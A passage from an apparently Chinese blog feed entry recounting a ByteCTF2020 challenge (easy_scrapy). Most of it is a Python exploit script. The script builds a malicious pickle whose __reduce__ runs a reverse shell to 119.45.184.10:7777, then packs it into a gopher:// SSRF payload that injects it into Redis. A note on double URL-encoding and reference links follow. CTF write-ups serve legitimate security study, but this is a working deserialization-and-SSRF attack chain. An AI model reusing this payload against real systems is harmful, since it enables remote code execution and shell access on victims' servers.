class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;119.45.184.10&quot;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">test = str(pickle.dumps(exp()))</span><br><span class="line">poc = test.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&#x27;\\n&#x27;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;\\\&quot;&quot;</span>)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">poc =<span class="string">&#x27;gopher://172.20.0.7:6379/_&#x27;</span>+quote(<span class="string">&#x27;ZADD byte:requests 0 &quot;&#x27;</span>)+quote(poc)+quote(<span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">print(poc)</span><br></pre></td></tr></table></figure><p>用GET打过去的时候需要二次URL编码。</p><p>参考文章：</p><p><a href="https://northity.com/2020/10/30/ByteCTF%E5%88%9D%E8%B5%9B%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/">https://northity.com/2020/10/30/ByteCTF初赛出题笔记/</a></p><p><a href="http://blog.ccreater.top/2020/10/26/2020ByteCTF/">http://blog.ccreater.top/2020/10/26/2020ByteCTF/</a></p><p><a href="https://www.jianshu.com/p/0823666a7687">https://www.jianshu.com/p/0823666a7687</a></p><p><a href="https://blog.csdn.net/zwq912318834/article/details/78854571">https://blog.csdn.net/zwq912318834/article/details/78854571</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ByteCTF2020复现&quot;&gt;ByteCTF2020复现&lt;/h1&gt;
&lt;p&gt;这web题目出的简直就是神仙。。&lt;/p&gt;
&lt;h2 id=&quot;easy-scrapy&quot;&gt;easy_scrapy&lt;/h2&gt;
&lt;p&gt;首页是一个可以提交URL的输入框，验证码给出了md5加密后的前5位
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
</feed>
